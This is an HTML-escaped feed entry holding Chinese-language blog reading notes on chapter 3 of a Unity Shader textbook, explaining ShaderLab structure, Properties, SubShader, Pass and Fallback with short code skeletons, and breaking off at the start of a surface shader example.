        <description>&lt;h1 id=&#34;unity-shader入门精要读书笔记-第三章-unity-shader基础&#34;&gt;Unity Shader入门精要读书笔记 第三章 Unity Shader基础
&lt;/h1&gt;&lt;h2 id=&#34;前言&#34;&gt;前言
&lt;/h2&gt;&lt;p&gt;Unity Shader的出现就是为了提供一个地方能够让开发者更轻松的管理着色器代码以及渲染设置，而不需要同各种shader文件一样管理多个文件、函数等。&lt;/p&gt;
&lt;h2 id=&#34;31-unity-shader概述&#34;&gt;3.1 Unity Shader概述
&lt;/h2&gt;&lt;h3 id=&#34;311-材质和unity-shader&#34;&gt;3.1.1 材质和Unity Shader
&lt;/h3&gt;&lt;p&gt;​	在Unity中，我们需要配合使用材质(Material)和Unity Shader才能达到需要的效果。Unity Shader定义渲染所需的代码、属性和指令，而材质允许我们自己调节这些属性，并赋给相应的模型。&lt;/p&gt;
&lt;h3 id=&#34;312-unity中的材质&#34;&gt;3.1.2 Unity中的材质
&lt;/h3&gt;&lt;p&gt;​	Unity中的材质需要结合一个GameObject的mesh或者Particle Systems(粒子系统)来工作。&lt;/p&gt;
&lt;h3 id=&#34;313-unity中的shader&#34;&gt;3.1.3 Unity中的Shader
&lt;/h3&gt;&lt;p&gt;​	Unity中的shader文件同渲染管线的shader不同，所以笔记中会同原著一样称为&lt;strong&gt;Unity Shader&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;​	在创建Unity Shader时，unity为我们提供了四种模板：&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;Standard Surface Shader&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;产生一个包含标准光照模型的表面着色器模板&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Unlit Shader&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;不包含光照（但包含雾效）的基本的顶点/片元着色器&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Image Effect Shader&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;为各种屏幕后处理效果提供基本模板&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Compute Shader&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;利用GPC的并行性来进行一些与常规渲染流水线无关的计算&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;​	由于《入门精要》这本书重点在如何在Unity中编写顶点/片元着色器，后续学习中通常会用Unlit Shader来生成一个基本的顶点/片元着色器模板。&lt;/p&gt;
&lt;p&gt;​	单独的Unity Shader不能发挥作用，必须同材质material结合起来。其本质上是一个文本文件，Unity Shader的导入设置面板可以看到该shader的一些相关信息（例如是否是固定函数着色器(fixed function)、是否投射阴影(cast shadows)、使用的渲染队列(Render queue)、属性(properties)列表等）。&lt;/p&gt;
&lt;h2 id=&#34;32-unity-shader的基础shaderlab&#34;&gt;3.2 Unity Shader的基础：ShaderLab
&lt;/h2&gt;&lt;p&gt;​	Unity专门提供了一种为Unity Shader服务的语言——&lt;strong&gt;ShaderLab&lt;/strong&gt;，Unity Shader为控制渲染过程提供了一层抽象，帮助开发者更简单的完成工作。ShaderLab时Unity提供的编写Unity Shader的一种说明性语言，使用一些嵌套在花括号内的语义来描述一个Unity Shader文件的结构。类似CgFX和Direct3D Effects(.FX)语言，定义了显示一个材质所需的所有东西，而&lt;strong&gt;不仅是着色器代码&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234038360-2058615356.png&#34;
	width=&#34;763&#34;
	height=&#34;361&#34;
	srcset=&#34;https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234038360-2058615356_hu3368549788139081952.png 480w, https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234038360-2058615356_hu7538809761253536864.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220702001109888&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;507px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;​	一个Unity Shader的基础结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Shader &amp;#34;ShaderName&amp;#34;{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Properties{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//属性
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	SubShader{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//显卡A使用的子着色器
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		SubShader{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//显卡B使用的子着色器
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Fallback &amp;#34;VertexLit&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;​	Unity会在背后根据使用的平台将这些结构编译成真正的代码和Shader文件，开发者只需要和Unity Shader打交道就行。&lt;/p&gt;
&lt;h2 id=&#34;33-unity-shader的结构&#34;&gt;3.3 Unity Shader的结构
&lt;/h2&gt;&lt;h3 id=&#34;331-给shader起名字&#34;&gt;3.3.1 给Shader起名字
&lt;/h3&gt;&lt;p&gt;​	用	&lt;code&gt;Shader &amp;quot;name&amp;quot;{ }&lt;/code&gt;就可以给Unity Shader命名，同时会出现在材质面板的下拉列表里。&lt;/p&gt;
&lt;p&gt;​	也可以添加前缀来有序组织位置分布，例如&lt;code&gt;Shader &amp;quot;Custom/MyShader&amp;quot;{}&lt;/code&gt;的效果如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234039393-605995405.png&#34;
	width=&#34;308&#34;
	height=&#34;319&#34;
	srcset=&#34;https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234039393-605995405_hu6505058552519215297.png 480w, https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/1858293-20220703234039393-605995405_hu11299695599508403216.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220702001328694&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;96&#34;
		data-flex-basis=&#34;231px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;332-材质和unity-shader的桥梁properties&#34;&gt;3.3.2 材质和Unity Shader的桥梁：Properties
&lt;/h3&gt;&lt;p&gt;​	Properties中包含一系列属性，这些属性会出现在材质面板中。&lt;/p&gt;
&lt;p&gt;​	其定义方式为 &lt;code&gt;_名字(&amp;quot;面板属性名&amp;quot;,类型)=默认值&lt;/code&gt;，如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Properties{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Name(&amp;#34;Display name&amp;#34;,propertyType) = DefaultValue
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Name(&amp;#34;Display name&amp;#34;,propertyType) = DefaultValue
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	//更多属性
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;​	属性的名字通常用一个&lt;strong&gt;下划线&lt;/strong&gt;开始。显示名字是出现在材质面板上的名字，同时需要指定类型和默认值。&lt;/p&gt;
&lt;p&gt;​	以下是Properties语义块支持的属性类型:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;属性类型&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;默认值的定义语法&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;例子&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Int&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;number&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Int(&amp;ldquo;Int&amp;rdquo;,Int) = 2&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Float&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;number&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Float(&amp;ldquo;Float&amp;rdquo;,Float) = 1.5&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Range(min,max)&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;number&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Range(&amp;ldquo;Range&amp;rdquo;,Range(0.0,5.0)) = 3.0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Color&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;(number,number,number,number)&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Color(&amp;ldquo;Color&amp;rdquo;,Color) = (1,1,1,1)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Vector&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;(number,number,number,number)&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Vector(&amp;ldquo;Vector&amp;rdquo;,Vector) = (6,2,3,1)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;2D&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;ldquo;defaulttexture&amp;rdquo;{}&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_2D(&amp;ldquo;2D&amp;rdquo;,2D) = &amp;ldquo;&amp;rdquo;{}&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Cube&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;ldquo;defaulttexture&amp;rdquo;{}&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_Cube(“Cube”,Cube) = &amp;ldquo;white&amp;rdquo;{}&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;3D&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&amp;ldquo;defaulttexture&amp;rdquo;{}&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;_3D(&amp;ldquo;3D&amp;rdquo;,3D) = &amp;ldquo;black&amp;rdquo;{}&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;​	Int、Float、Range：数字类型的属性，默认值是单独的数字。&lt;/p&gt;
&lt;p&gt;​	Color、Vector：默认值是括号包围的四维向量。&lt;/p&gt;
&lt;p&gt;​	2D、Cube、3D：默认值是字符串和花括号，字符串要么为空，要么是内置的纹理名称；花括号用于指定一些纹理属性，在Unitu5.0之后被移除。&lt;/p&gt;
&lt;h3 id=&#34;333-重量级成员subshader&#34;&gt;3.3.3 重量级成员：SubShader
&lt;/h3&gt;&lt;p&gt;​	一个Unity Shader可以包含多个SubShader语义块，至少要有一个。加载unity shader时会扫描所有SubShader，选择第一个能在目标平台运行的SubShader；如果都不支持，那么使用Fallback指定的UnityShader。&lt;/p&gt;
&lt;p&gt;​	SubShader的结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SubShader{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	//可选
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	[Tags]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	//可选
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	[RenderSetup]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Pass{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	//其他的pass
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;​	挨个介绍：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;标签Tags和状态RenderSetup都是可选的，在SubShader中的设置会适用到所有pass。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;标签Tags是一个键值对，都是字符串，&lt;em&gt;代表着SubShader希望以怎样、何时来渲染此对象。&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;状态RenderSetup可以&lt;em&gt;设置显卡的各种状态&lt;/em&gt;，并应用到所有的pass。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Pass语义块则是&lt;em&gt;一次&lt;strong&gt;完整的渲染流程&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;来说说Pass：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Pass{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	[Name]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	[Tags]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	[RenderSetup]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	//code
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;显然我们可以定义pass的名称，我们也可以引用其他Unity Shader的pass，如：&lt;code&gt;UsePass &amp;quot;MyShader/MYPASSNAME&amp;quot;&lt;/code&gt;,值得注意的是，&lt;em&gt;unity内部会把所有Pass名称转换为大写字母&lt;/em&gt;，所有我们这里也要用大写字母。&lt;/p&gt;
&lt;p&gt;Pass内部也可以设置标签/渲染状态，用于告诉渲染引擎如何渲染该物体。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;334-留后路fallback&#34;&gt;3.3.4 留后路：Fallback
&lt;/h3&gt;&lt;p&gt;​	Fallback规定了当所有的SubShader都不能在显卡上运行的时候所使用的Shader。&lt;/p&gt;
&lt;p&gt;​	开发者可以关闭Fallback，但是这会影响投影的投射。因为Fallback使用的内置shader包含了一个通用的Pass，这会造成阴影投射的效果。&lt;/p&gt;
&lt;h3 id=&#34;335-其他语义&#34;&gt;3.3.5 其他语义
&lt;/h3&gt;&lt;p&gt;​	比如CustomEditor语言扩展自定义编辑界面。&lt;/p&gt;
&lt;p&gt;​	比如Category语义对Unity Shader中的命令分组。&lt;/p&gt;
&lt;h2 id=&#34;34-unity-shader的形式&#34;&gt;3.4 Unity Shader的形式
&lt;/h2&gt;&lt;p&gt;​	在Unity中有三种形式来编写Unity Shader：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Shader &amp;#34;MyShader&amp;#34;{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Properties{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//所需的各种属性
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	SubShader{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//真正意义上的Shader代码会出现在这里
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//表面着色器（Subface Shader） 或者
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//顶点/片元着色器（Vertex/Fragment Shader） 或者
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//固定函数着色器（Fixed Function Shader）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	SubShader{
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		//同上
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;341-表面着色器&#34;&gt;3.4.1 表面着色器
&lt;/h3&gt;&lt;p&gt;​	**表面着色器（Sruface Shader）**是Unity自己创造的一种着色器代码类型，代码量少；本质上还是顶点/片元着色器，可以看作是Unity对顶点/片元着色器的高层抽象。&lt;/p&gt;
&lt;p&gt;​	表面着色器的价值在于Unity帮我们处理了很多光照细节。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Shader &amp;#34;Custom/Simple Surface shader&amp;#34; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	Subshader{
